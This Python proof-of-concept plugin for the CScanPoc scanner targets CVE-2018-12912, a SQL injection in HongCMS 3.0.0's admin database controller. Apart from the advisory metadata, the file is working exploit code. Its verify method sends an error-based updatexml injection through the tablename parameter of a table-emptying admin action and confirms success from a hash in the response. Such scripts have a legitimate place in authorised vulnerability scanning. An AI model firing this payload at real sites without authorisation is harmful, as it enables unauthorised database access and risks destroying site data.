# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'HongCMS_0006'  # 平台漏洞编号
    name = 'HongCMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2018-07-25'  # 漏洞公布时间
    desc = '''
    HongCMS 3.0.0版本中的admin\controllers\database.php文件存在SQL注入漏洞。远程攻击者可借助admin/index.php/database/operate?dbaction=emptytable&tablename= URI利用该漏洞执行任意的SQL命令。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-13877'
    cnvd_id = 'CNVD-2018-13877'  # cnvd漏洞编号
    cve_id = 'CVE-2018-12912'  # cve编号
    product = 'HongCMS'  # 漏洞组件名称
    product_version = '3.0.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '562d665a-afd3-4f26-b874-47f958d4d01c'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookie': {
                    'type': 'string',
                    'description': '登录cookie',
                    'default': '',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            self.output.info('正在生成SQL注入测试语句')
            headers = {
                'Cookie': self.get_option('cookie'),
                'Content-Type': 'application/x-www-form-urlencoded',
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
            }
            payload = "/admin/index.php/database/operate?dbaction=emptytable&tablename=hong_vvc` where vvcid=1 or updatexml(2,concat(0x7e,(md5(233))),0) or `"
            vul_url = arg + payload
            reponse = requests.get(vul_url, headers=headers)

            if reponse.status_code == 200 and 'e165421110ba03099a1c0393373c5b4' in reponse.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
